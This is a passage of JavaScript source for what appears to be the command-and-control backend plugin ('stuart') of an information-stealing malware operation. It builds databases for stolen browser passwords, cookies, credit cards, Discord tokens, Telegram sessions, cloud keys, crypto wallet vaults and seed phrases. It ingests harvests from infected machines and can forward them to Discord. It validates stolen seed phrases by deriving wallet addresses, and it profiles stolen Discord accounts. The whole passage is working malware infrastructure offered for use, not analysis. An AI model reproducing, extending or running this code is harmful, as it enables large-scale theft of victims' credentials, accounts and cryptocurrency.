        path TEXT NOT NULL,
        type TEXT,
        addresses TEXT,
        vault_data TEXT,
        content BLOB,
        size INTEGER,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS wld_client ON wallet_data(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS wld_client_name ON wallet_data(client_id, name);

      CREATE TABLE IF NOT EXISTS telegram_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        account TEXT NOT NULL,
        path TEXT,
        files INTEGER,
        size INTEGER,
        content BLOB,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS tg_client ON telegram_sessions(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS tg_client_account ON telegram_sessions(client_id, account);

      CREATE TABLE IF NOT EXISTS cloud_keys (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        type TEXT NOT NULL,
        name TEXT NOT NULL,
        path TEXT,
        size INTEGER,
        content TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS ck2_client ON cloud_keys(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS ck2_dedup ON cloud_keys(client_id, type, name, path);

      CREATE TABLE IF NOT EXISTS seeds (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        source TEXT NOT NULL,
        path TEXT,
        phrase TEXT NOT NULL,
        words INTEGER NOT NULL,
        valid INTEGER DEFAULT 0,
        addresses TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS sd_client ON seeds(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS sd_phrase ON seeds(client_id, phrase);

      CREATE TABLE IF NOT EXISTS app_credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        application TEXT NOT NULL,
        host TEXT,
        port INTEGER,
        username TEXT,
        password TEXT,
        protocol TEXT,
        extra TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS ac_client ON app_credentials(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS ac_dedup ON app_credentials(client_id, application, host, username, protocol);

      CREATE TABLE IF NOT EXISTS client_runs (
        client_id TEXT PRIMARY KEY,
        last_captured_at INTEGER NOT NULL
      );
    `);
    // Migrations for installs predating these fields
    try { ctx.db.exec(`ALTER TABLE files ADD COLUMN tags TEXT`); } catch (_) {}
    try { ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS discord_profiles (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL, token TEXT NOT NULL UNIQUE,
        user_id TEXT, username TEXT, discriminator TEXT, global_name TEXT,
        avatar TEXT, email TEXT, phone TEXT,
        verified INTEGER, mfa_enabled INTEGER, premium_type INTEGER,
        flags INTEGER, public_flags INTEGER, locale TEXT,
        friends_count INTEGER, guilds_count INTEGER, guild_names TEXT,
        enriched_at INTEGER, error TEXT
      );
      CREATE INDEX IF NOT EXISTS dp_client ON discord_profiles(client_id);
    `); } catch (_) {}
    try { ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS extensions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        ext_id TEXT, name TEXT, version TEXT, browser TEXT, profile TEXT, path TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS ex_client ON extensions(client_id);
    `); } catch (_) {}
    try { ctx.db.exec(`ALTER TABLE extensions ADD COLUMN category TEXT`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS pw_dedup ON passwords(client_id, url, username, browser, profile)`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS ck_dedup ON cookies(client_id, host, name, path, browser, profile)`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS af_dedup ON autofill(client_id, name, value, browser, profile)`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS hi_dedup ON history(client_id, url, visit_time_unix, browser, profile)`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS bk_dedup ON bookmarks(client_id, url, browser, profile)`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS cc_dedup ON credit_cards(client_id, card_number, name_on_card, browser, profile)`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS dt_dedup ON discord_tokens(client_id, token)`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS fi_dedup ON files(client_id, path)`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS ex_dedup ON extensions(client_id, ext_id, browser, profile)`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS wl_dedup ON wallets(client_id, name, path)`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS ck2_dedup ON cloud_keys(client_id, type, name, path)`); } catch (_) {}
    try { ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS wallets (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        name TEXT, path TEXT, files INTEGER, size INTEGER,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS wl_client ON wallets(client_id);
    `); } catch (_) {}
    try { ctx.db.exec(`ALTER TABLE wallets ADD COLUMN type TEXT`); } catch (_) {}
    try { ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS wallet_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL, name TEXT NOT NULL, path TEXT NOT NULL,
        type TEXT, addresses TEXT, vault_data TEXT, content BLOB, size INTEGER,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS wld_client ON wallet_data(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS wld_client_name ON wallet_data(client_id, name);
    `); } catch (_) {}
    try { ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS telegram_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL, account TEXT NOT NULL, path TEXT,
        files INTEGER, size INTEGER, content BLOB, captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS tg_client ON telegram_sessions(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS tg_client_account ON telegram_sessions(client_id, account);
    `); } catch (_) {}
    try { ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS cloud_keys (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL, type TEXT NOT NULL, name TEXT NOT NULL,
        path TEXT, size INTEGER, content TEXT, captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS ck2_client ON cloud_keys(client_id);
    `); } catch (_) {}
    try { ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS seeds (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL, source TEXT NOT NULL, path TEXT,
        phrase TEXT NOT NULL, words INTEGER NOT NULL,
        valid INTEGER DEFAULT 0, addresses TEXT, captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS sd_client ON seeds(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS sd_phrase ON seeds(client_id, phrase);
    `); } catch (_) {}
    try { ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS app_credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL, application TEXT NOT NULL,
        host TEXT, port INTEGER, username TEXT, password TEXT,
        protocol TEXT, extra TEXT, captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS ac_client ON app_credentials(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS ac_dedup ON app_credentials(client_id, application, host, username, protocol);
    `); } catch (_) {}
    try { ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS gaming_items (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL, platform TEXT NOT NULL,
        label TEXT NOT NULL, value TEXT, detail TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS gi_client ON gaming_items(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS gi_dedup ON gaming_items(client_id, platform, label, value);
    `); } catch (_) {}
    try { ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS vpn_items (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL, provider TEXT NOT NULL,
        label TEXT NOT NULL, value TEXT, detail TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS vi_client ON vpn_items(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS vi_dedup ON vpn_items(client_id, provider, label, value);
    `); } catch (_) {}
    // Settings table
    ctx.db.exec(`CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)`);

    // blob_path columns for disk-backed BLOBs
    try { ctx.db.exec(`ALTER TABLE wallet_data ADD COLUMN blob_path TEXT`); } catch (_) {}
    try { ctx.db.exec(`ALTER TABLE telegram_sessions ADD COLUMN blob_path TEXT`); } catch (_) {}

    // Create blob directory
    blobDir = join(ctx.dataDir, "blobs");
    try { mkdirSync(blobDir, { recursive: true }); } catch (_) {}

    // One-time migration: move BLOBs from DB to disk + enable auto-vacuum
    const migDone = ctx.db.prepare(`SELECT value FROM settings WHERE key = 'blob_migration_done'`).get();
    if (!migDone) {
      let migrated = 0;
      const wdRows = ctx.db.prepare(`SELECT id, client_id, name, content FROM wallet_data WHERE content IS NOT NULL AND blob_path IS NULL`).all();
      for (const r of wdRows) {
        const bp = walletBlobPath(r.client_id, r.name);
        if (writeBlob(bp, Buffer.from(r.content))) {
          ctx.db.prepare(`UPDATE wallet_data SET blob_path = ?, content = NULL WHERE id = ?`).run(bp, r.id);
          migrated++;
        }
      }
      const tgRows = ctx.db.prepare(`SELECT id, client_id, account, content FROM telegram_sessions WHERE content IS NOT NULL AND blob_path IS NULL`).all();
      for (const r of tgRows) {
        const bp = telegramBlobPath(r.client_id, r.account);
        if (writeBlob(bp, Buffer.from(r.content))) {
          ctx.db.prepare(`UPDATE telegram_sessions SET blob_path = ?, content = NULL WHERE id = ?`).run(bp, r.id);
          migrated++;
        }
      }
      if (migrated > 0) console.log(`[stuart] migrated ${migrated} BLOBs to disk`);
      try {
        ctx.db.exec(`PRAGMA auto_vacuum=INCREMENTAL`);
        ctx.db.exec(`VACUUM`);
        console.log("[stuart] VACUUM complete — auto_vacuum=INCREMENTAL enabled");
      } catch (e) { console.error("[stuart] VACUUM failed:", e.message); }
      ctx.db.prepare(`INSERT OR REPLACE INTO settings(key,value) VALUES('blob_migration_done','1')`).run();
    }

    // Reclaim freed pages from recent deletes
    try { ctx.db.exec(`PRAGMA incremental_vacuum`); } catch (_) {}

    // Track processed Discord zip attachments (bot poll import)
    ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS discord_imports (
        attachment_id TEXT PRIMARY KEY,
        message_id TEXT,
        thread_id TEXT,
        client_id TEXT,
        filename TEXT,
        imported_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS di_client ON discord_imports(client_id);
    `);

    // Load settings and run purge
    loadSettings(ctx.db);
    pluginCtx = ctx;
    try {
      const nowChrome = (Date.now() + 11644473600000) * 1000;
      const expired = ctx.db.prepare(`DELETE FROM cookies WHERE expires_utc > 0 AND expires_utc < ?`).run(nowChrome);
      if (expired.changes > 0) console.log(`[stuart] purged ${expired.changes} expired cookies`);
      const purged = runPurge(ctx.db);
      if (purged > 0) console.log(`[stuart] purged ${purged} rows (history/cookie limits)`);
    } catch (_) {}

    try {
      stmts = prepareStatements(ctx.db);
    } catch (err) {
      console.error("[stuart] prepareStatements failed:", err.message, err.stack || "");
      throw err;
    }

  },

  onEvent(ctx, clientId, event, payload) {
    if (!stmts) { console.error("[stuart] onEvent called but stmts is null — setup likely failed"); return; }
    const now = Date.now();
    pluginCtx = ctx;

    /**
     * Discord pipeline ON → buffer only until harvest settles, then ONE forum post.
     * @param {object} agentPayload
     * @param {{ replace?: boolean, settle?: boolean }} opts
     *   replace: full `results` replaces partial buffer
     *   settle: start/restart quiet timer → single zip upload (false for partials)
     */
    const viaDiscord = (agentPayload, opts = {}) => {
      const settle = opts.settle !== false;
      bufferDiscordHarvest(clientId, agentPayload, { replace: !!opts.replace });
      if (settle) {
        scheduleDiscordFinalize(clientId);
        try { ctx.broadcast("discord_upload_pending", { clientId, settling: true }); } catch (_) {}
      }
    };

    if (event === "results") {
      if (isDiscordPipelineOn()) {
        // Full collect payload — replace partials; wait for wallet_auto_data if wallets listed
        if (payload?.wallets?.length) noteExpectedWallets(clientId, payload.wallets);
        viaDiscord(payload || {}, { replace: true, settle: true });
        return;
      }
      const tx = ctx.db.transaction(() => {
        insertPayload(ctx.db, stmts, clientId, payload, now);
        stmts.upsertRun.run(clientId, now);
      });
      tx();
      for (const r of payload.discordTokens || [])
        enrichDiscordToken(ctx, clientId, r.token).catch(() => {});
      ctx.broadcast("harvest_update", { clientId });
    } else if (event === "partial") {
      if (isDiscordPipelineOn()) {
        // Buffer only — do NOT upload mid-harvest
        viaDiscord(payload || {}, { settle: false });
        return;
      }
      const tx = ctx.db.transaction(() => {
        insertPayload(ctx.db, stmts, clientId, payload, now);
        stmts.upsertRun.run(clientId, now);
      });
      tx();
      for (const r of payload.discordTokens || [])
        if (needsEnrichment(ctx, r.token))
          enrichDiscordToken(ctx, clientId, r.token).catch(() => {});
      ctx.broadcast("harvest_update", { clientId });
    } else if (event === "file_scan_results") {
      if (isDiscordPipelineOn()) {
        viaDiscord({ files: payload?.files || [] });
        return;
      }
      const tx = ctx.db.transaction(() => {
        for (const r of payload?.files || [])
          stmts.insFi.run(clientId, r.dir, r.name, r.ext, r.size, r.modified, r.path, (r.tags || []).join(",") || null, now);
        stmts.upsertRun.run(clientId, now);
      });
      tx();
      ctx.broadcast("harvest_update", { clientId });
    } else if (event === "extension_scan_results") {
      if (isDiscordPipelineOn()) {
        viaDiscord({ extensions: payload?.extensions || [] });
        return;
      }
      const tx = ctx.db.transaction(() => {
        for (const r of payload?.extensions || [])
          stmts.insEx.run(clientId, r.extId, r.name, r.version, r.browser, r.profile, r.path, r.category || null, now);
        stmts.upsertRun.run(clientId, now);
      });
      tx();
      ctx.broadcast("harvest_update", { clientId });
    } else if (event === "wallet_scan_results") {
      if (isDiscordPipelineOn()) {
        if (payload?.wallets?.length) noteExpectedWallets(clientId, payload.wallets);
        viaDiscord({ wallets: payload?.wallets || [] });
        return;
      }
      const tx = ctx.db.transaction(() => {
        for (const r of payload?.wallets || [])
          stmts.insWl.run(clientId, r.name, r.type || null, r.path, r.files, r.size, now);
        stmts.upsertRun.run(clientId, now);
      });
      tx();
      ctx.broadcast("harvest_update", { clientId });
    } else if (event === "wallet_auto_start") {
      if (isDiscordPipelineOn()) {
        const names = payload?.names || (payload?.wallets || []).map(w => w.name);
        noteExpectedWallets(clientId, payload?.wallets || names);
        console.log(`[stuart] wallet_auto_start client=${clientId} count=${payload?.count || names?.length || 0}`);
      }
    } else if (event === "wallet_auto_skip") {
      if (isDiscordPipelineOn()) {
        noteWalletSkipped(clientId, payload?.name);
        console.log(`[stuart] wallet_auto_skip ${payload?.name}: ${payload?.reason || ""}`);
        if (walletsReadyForFlush(clientId)) scheduleDiscordFinalize(clientId);
      }
    } else if (event === "wallet_auto_chunk_start" || event === "wallet_auto_chunk" || event === "wallet_auto_chunk_end") {
      // Large wallets (MetaMask ~9MB) arrive as chunks so the C2 event channel doesn't drop them
      if (isDiscordPipelineOn()) {
        handleWalletChunkEvent(clientId, event, payload || {});
        if (event === "wallet_auto_chunk_end") {
          if (payload?.name) {
            bufferDiscordHarvest(clientId, {
              wallets: [{ name: payload.name, type: null, path: "", files: 0, size: payload.size || 0 }],
            }, { replace: false });
          }
          scheduleDiscordFinalize(clientId);
          try { ctx.broadcast("discord_upload_pending", { clientId, wallets: true }); } catch (_) {}
        }
        return;
      }
      // Pipeline off: still reassemble then write C2
      handleWalletChunkEvent(clientId, event, payload || {});
      if (event === "wallet_auto_chunk_end") {
        const list = pendingDiscordWallets.get(clientId) || [];
        const w = list.find(x => x.name === payload?.name);
        if (w) {
          let bp = null;
          if (blobDir) {
            bp = walletBlobPath(clientId, w.name);
            if (!writeBlob(bp, w.content)) bp = null;
          }
          ctx.db.prepare(`INSERT OR REPLACE INTO wallet_data(client_id,name,path,type,addresses,vault_data,content,blob_path,size,captured_at) VALUES(?,?,?,?,?,?,?,?,?,?)`)
            .run(clientId, w.name, w.path || "", w.type || null,
              JSON.stringify(w.addresses || []), w.vaultData || null,
              bp ? null : w.content, bp, w.content.length, now);
          // remove from discord buffer (not using pipeline)
          pendingDiscordWallets.set(clientId, list.filter(x => x.name !== w.name));
          noteWalletReceived(clientId, w.name);
          ctx.broadcast("wallet_data_update", { clientId, name: w.name });
        }
      }
    } else if (event === "wallet_auto_done") {
      if (isDiscordPipelineOn()) {
        noteWalletsDone(clientId);
        console.log(
          `[stuart] wallet_auto_done client=${clientId} sent=${payload?.sent} expected=${payload?.expected} ` +
          `buffered=${(pendingDiscordWallets.get(clientId) || []).length}`
        );
        scheduleDiscordFinalize(clientId);
      }
    } else if (event === "wallet_auto_data") {
      if (isDiscordPipelineOn()) {
        // Discord pipeline ONLY — do not write wallet blobs to C2 until after Discord import
        const ok = bufferDiscordWallet(clientId, payload || {});
        if (payload?.name) {
          bufferDiscordHarvest(clientId, {
            wallets: [{
              name: payload.name,
              type: payload.type,
              path: payload.path,
              files: 0,
              size: payload.size || 0,
            }],
          }, { replace: false });
        }
        scheduleDiscordFinalize(clientId);
        try { ctx.broadcast("discord_upload_pending", { clientId, wallets: true }); } catch (_) {}
        return;
      }
      const content = payload.content ? Buffer.from(payload.content, 'base64') : null;
      let bp = null;
      if (content && blobDir) {
        bp = walletBlobPath(clientId, payload.name);
        if (!writeBlob(bp, content)) bp = null;
      }
      ctx.db.prepare(`INSERT OR REPLACE INTO wallet_data(client_id,name,path,type,addresses,vault_data,content,blob_path,size,captured_at) VALUES(?,?,?,?,?,?,?,?,?,?)`)
        .run(clientId, payload.name, payload.path, payload.type || null,
             JSON.stringify(payload.addresses || []), payload.vaultData || null,
             bp ? null : content, bp, payload.size || 0, now);
      ctx.broadcast("wallet_data_update", { clientId, name: payload.name });
    } else if (event === "telegram_scan_results") {
      if (isDiscordPipelineOn()) {
        viaDiscord({ telegram: payload?.sessions || [] });
        return;
      }
      const tx = ctx.db.transaction(() => {
        for (const r of payload?.sessions || [])
          stmts.insTg.run(clientId, r.account, r.path, r.files, r.size, now);
        stmts.upsertRun.run(clientId, now);
      });
      tx();
      ctx.broadcast("harvest_update", { clientId });
    } else if (event === "telegram_data") {
      const content = payload.content ? Buffer.from(payload.content, 'base64') : null;
      let bp = null;
      if (content && blobDir) {
        bp = telegramBlobPath(clientId, payload.account);
        if (!writeBlob(bp, content)) bp = null;
      }
      ctx.db.prepare(`INSERT OR REPLACE INTO telegram_sessions(client_id,account,path,files,size,content,blob_path,captured_at) VALUES(?,?,?,?,?,?,?,?)`)
        .run(clientId, payload.account, payload.path, 0, payload.size || 0, bp ? null : content, bp, now);
      ctx.broadcast("telegram_data_update", { clientId, account: payload.account });
    } else if (event === "app_scan_results") {
      if (isDiscordPipelineOn()) {
        viaDiscord({ appCredentials: payload?.appCredentials || [] });
        return;
      }
      const tx = ctx.db.transaction(() => {
        for (const r of payload?.appCredentials || [])
          stmts.insApp.run(clientId, r.application, r.host || null, r.port || 0, r.username || null, r.password || null, r.protocol || null, r.extra || null, now);
        stmts.upsertRun.run(clientId, now);
      });
      tx();
      ctx.broadcast("harvest_update", { clientId });
    } else if (event === "gaming_scan_results") {
      if (payload?.gaming) {
        if (isDiscordPipelineOn()) {
          viaDiscord({ gaming: payload.gaming });
          return;
        }
        const tx = ctx.db.transaction(() => {
          insertPayload(ctx.db, stmts, clientId, { gaming: payload.gaming }, now);
          stmts.upsertRun.run(clientId, now);
        });
        tx();
        ctx.broadcast("harvest_update", { clientId });
      }
    } else if (event === "vpn_scan_results") {
      if (payload?.vpns) {
        if (isDiscordPipelineOn()) {
          viaDiscord({ vpns: payload.vpns });
          return;
        }
        const tx = ctx.db.transaction(() => {
          insertPayload(ctx.db, stmts, clientId, { vpns: payload.vpns }, now);
          stmts.upsertRun.run(clientId, now);
        });
        tx();
        ctx.broadcast("harvest_update", { clientId });
      }
    } else if (event === "key_scan_results") {
      if (isDiscordPipelineOn()) {
        viaDiscord({ keys: payload?.keys || [] });
        return;
      }
      const tx = ctx.db.transaction(() => {
        for (const r of payload?.keys || [])
          stmts.insKey.run(clientId, r.type, r.name, r.path, r.size, r.content || null, now);
        stmts.upsertRun.run(clientId, now);
      });
      tx();
      ctx.broadcast("harvest_update", { clientId });
    } else if (event === "seed_scan_results") {
      const seeds = payload?.seeds || [];
      if (!seeds.length) return;
      if (isDiscordPipelineOn()) {
        viaDiscord({ seeds });
        return;
      }
      const tx = ctx.db.transaction(() => {
        for (const s of seeds) {
          const words = s.phrase.split(/\s+/);
          let valid = 0;
          let addresses = null;
          try {
            if (words.every(w => wordlist.includes(w))) {
              valid = 1;
              const addrs = [
                ...deriveEthAddresses(s.phrase, 2).map(a => ({ chain: "EVM", address: a })),
                ...deriveBtcAddresses(s.phrase, 1).map(a => ({ chain: "BTC", address: a })),
                ...deriveLtcAddresses(s.phrase, 1).map(a => ({ chain: "LTC", address: a })),
                ...deriveTrxAddresses(s.phrase, 1).map(a => ({ chain: "TRX", address: a })),
              ];
              addresses = JSON.stringify(addrs);
            }
          } catch (_) {}
          stmts.insSeed.run(clientId, s.source, s.path || null, s.phrase, s.words, valid, addresses, now);
        }
        stmts.upsertRun.run(clientId, now);
      });
      tx();
      ctx.broadcast("seed_update", { clientId, count: seeds.length });
    }
  },

  rpc: {
    get_stats(ctx) {
      return ctx.db.prepare(`
        WITH
          pw AS (SELECT client_id, COUNT(*) AS c FROM passwords GROUP BY client_id),
          ck AS (SELECT client_id, COUNT(*) AS c FROM cookies GROUP BY client_id),
          af AS (SELECT client_id, COUNT(*) AS c FROM autofill GROUP BY client_id),
          hi AS (SELECT client_id, COUNT(*) AS c FROM history GROUP BY client_id),
          bk AS (SELECT client_id, COUNT(*) AS c FROM bookmarks GROUP BY client_id),
          cc AS (SELECT client_id, COUNT(*) AS c FROM credit_cards GROUP BY client_id),
          dt AS (SELECT client_id, COUNT(*) AS c FROM discord_tokens GROUP BY client_id),
          fi AS (SELECT client_id, COUNT(*) AS c FROM files GROUP BY client_id),
          ex AS (SELECT client_id, COUNT(*) AS c FROM extensions GROUP BY client_id),
          wl AS (SELECT client_id, COUNT(*) AS c FROM wallets GROUP BY client_id),
          tg AS (SELECT client_id, COUNT(*) AS c FROM telegram_sessions GROUP BY client_id),
          ky AS (SELECT client_id, COUNT(*) AS c FROM cloud_keys GROUP BY client_id),
          sd AS (SELECT client_id, COUNT(*) AS c FROM seeds GROUP BY client_id),
          ac AS (SELECT client_id, COUNT(*) AS c FROM app_credentials GROUP BY client_id),
          gi AS (SELECT client_id, COUNT(*) AS c FROM gaming_items GROUP BY client_id),
          vi AS (SELECT client_id, COUNT(*) AS c FROM vpn_items GROUP BY client_id)
        SELECT
          cr.client_id AS clientId,
          cr.last_captured_at AS lastCapturedAt,
          COALESCE(pw.c,0) AS passwords,
          COALESCE(ck.c,0) AS cookies,
          COALESCE(af.c,0) AS autofill,
          COALESCE(hi.c,0) AS history,
          COALESCE(bk.c,0) AS bookmarks,
          COALESCE(cc.c,0) AS creditCards,
          COALESCE(dt.c,0) AS discordTokens,
          COALESCE(fi.c,0) AS files,
          COALESCE(ex.c,0) AS extensions,
          COALESCE(wl.c,0) AS wallets,
          COALESCE(tg.c,0) AS telegram,
          COALESCE(ky.c,0) AS keys,
          COALESCE(sd.c,0) AS seeds,
          COALESCE(ac.c,0) AS appCredentials,
          COALESCE(gi.c,0) AS gamingItems,
          COALESCE(vi.c,0) AS vpnItems
        FROM client_runs cr
        LEFT JOIN pw ON pw.client_id = cr.client_id
        LEFT JOIN ck ON ck.client_id = cr.client_id
        LEFT JOIN af ON af.client_id = cr.client_id
        LEFT JOIN hi ON hi.client_id = cr.client_id
        LEFT JOIN bk ON bk.client_id = cr.client_id
        LEFT JOIN cc ON cc.client_id = cr.client_id
        LEFT JOIN dt ON dt.client_id = cr.client_id
        LEFT JOIN fi ON fi.client_id = cr.client_id
        LEFT JOIN ex ON ex.client_id = cr.client_id
        LEFT JOIN wl ON wl.client_id = cr.client_id
        LEFT JOIN tg ON tg.client_id = cr.client_id
        LEFT JOIN ky ON ky.client_id = cr.client_id
        LEFT JOIN sd ON sd.client_id = cr.client_id
        LEFT JOIN ac ON ac.client_id = cr.client_id
        LEFT JOIN gi ON gi.client_id = cr.client_id
        LEFT JOIN vi ON vi.client_id = cr.client_id
        ORDER BY cr.last_captured_at DESC
      `).all();
    },

    async get_summary(ctx) {
      const clients = ctx.db.prepare(`
        WITH
          pw AS (SELECT client_id, COUNT(*) AS c FROM passwords GROUP BY client_id),
          ck AS (SELECT client_id, COUNT(*) AS c FROM cookies GROUP BY client_id),
          cc AS (SELECT client_id, COUNT(*) AS c FROM credit_cards GROUP BY client_id),
          dt AS (SELECT client_id, COUNT(*) AS c FROM discord_tokens GROUP BY client_id),
          wl AS (SELECT client_id, COUNT(*) AS c FROM wallets GROUP BY client_id)
        SELECT
          cr.client_id AS clientId,
          cr.last_captured_at AS lastCapturedAt,
          COALESCE(pw.c,0) AS passwords,
          COALESCE(ck.c,0) AS cookies,
          COALESCE(cc.c,0) AS creditCards,
          COALESCE(dt.c,0) AS discordTokens,
          COALESCE(wl.c,0) AS wallets
        FROM client_runs cr
        LEFT JOIN pw ON pw.client_id = cr.client_id
        LEFT JOIN ck ON ck.client_id = cr.client_id
        LEFT JOIN cc ON cc.client_id = cr.client_id
        LEFT JOIN dt ON dt.client_id = cr.client_id
        LEFT JOIN wl ON wl.client_id = cr.client_id
        ORDER BY cr.last_captured_at DESC
      `).all();

      const allWallets = ctx.db.prepare(`SELECT client_id, name, type FROM wallets`).all();
      const allWalletData = ctx.db.prepare(`SELECT client_id, name, content IS NOT NULL AS hasContent, vault_data IS NOT NULL AS hasVault FROM wallet_data`).all();
      const allPwCounts = ctx.db.prepare(`SELECT client_id, COUNT(*) AS cnt FROM passwords WHERE password IS NOT NULL AND password != '' GROUP BY client_id`).all();

      const walletsByClient = {};
      for (const w of allWallets) {
        (walletsByClient[w.client_id] ??= []).push(w);
      }
      const walletDataByClient = {};
      for (const w of allWalletData) {
        (walletDataByClient[w.client_id] ??= []).push(w);
      }
      const pwCountMap = {};
      for (const p of allPwCounts) pwCountMap[p.client_id] = p.cnt;

      return clients.map(c => {
        const walletRows = walletsByClient[c.clientId] || [];
        const walletDataRows = walletDataByClient[c.clientId] || [];
        const downloaded = walletDataRows.filter(w => w.hasContent);
        return {
          ...c,
          walletNames: walletRows.map(w => w.name),
          walletDownloaded: downloaded.map(w => w.name),
          walletVaults: downloaded.filter(w => w.hasVault).map(w => w.name),
          passwordCount: pwCountMap[c.clientId] || 0,
        };
      });
    },

    list_passwords(ctx, params)      { return listTable(ctx, TABLE_CFGS.passwords,      params); },
    list_cookies(ctx, params)        { return listTable(ctx, TABLE_CFGS.cookies,        params); },
    list_autofill(ctx, params)       { return listTable(ctx, TABLE_CFGS.autofill,       params); },
    list_history(ctx, params)        { return listTable(ctx, TABLE_CFGS.history,        params); },
    list_bookmarks(ctx, params)      { return listTable(ctx, TABLE_CFGS.bookmarks,      params); },
    list_credit_cards(ctx, params)   { return listTable(ctx, TABLE_CFGS.credit_cards,   params); },
    list_discord_tokens(ctx, params) { return listTable(ctx, TABLE_CFGS.discord_tokens, params); },

    list_discord_profiles(ctx, params) {
      const cid    = params?.clientId;
      const search = String(params?.search || '').trim();
      const wheres = [], args = [];
      if (cid)    { wheres.push('dt.client_id = ?'); args.push(cid); }
      if (search) {
        wheres.push('(dt.token LIKE ? OR dp.username LIKE ? OR dp.email LIKE ? OR dp.global_name LIKE ?)');
        args.push(`%${search}%`, `%${search}%`, `%${search}%`, `%${search}%`);
      }
      const where = wheres.length ? ' WHERE ' + wheres.join(' AND ') : '';
      const rows = ctx.db.prepare(`
        SELECT dt.client_id as clientId, dt.token, dt.source, dt.captured_at,
               dp.user_id, dp.username, dp.discriminator, dp.global_name, dp.avatar,
               dp.email, dp.phone, dp.verified, dp.mfa_enabled, dp.premium_type,
               dp.flags, dp.public_flags, dp.locale, dp.friends_count, dp.guilds_count,
               dp.guild_names, dp.enriched_at, dp.error
        FROM discord_tokens dt
        LEFT JOIN discord_profiles dp ON dp.token = dt.token
        ${where}
        ORDER BY dt.captured_at DESC
      `).all(...args);
      return { rows, total: rows.length };
    },

    async enrich_discord_token(ctx, params) {
      const { token, clientId } = params || {};
      if (!token)    throw new Error('token required');
      if (!clientId) throw new Error('clientId required');
      await enrichDiscordToken(ctx, clientId, token);
      const profile = ctx.db.prepare(`SELECT * FROM discord_profiles WHERE token = ?`).get(token);
      return { ok: true, profile };
    },

    async enrich_all_discord(ctx, params) {
      const cid   = params?.clientId;
      const where = cid ? 'WHERE client_id = ?' : '';
      const args  = cid ? [cid] : [];
      const tokens = ctx.db.prepare(`SELECT client_id, token FROM discord_tokens ${where} ORDER BY captured_at DESC`).all(...args);
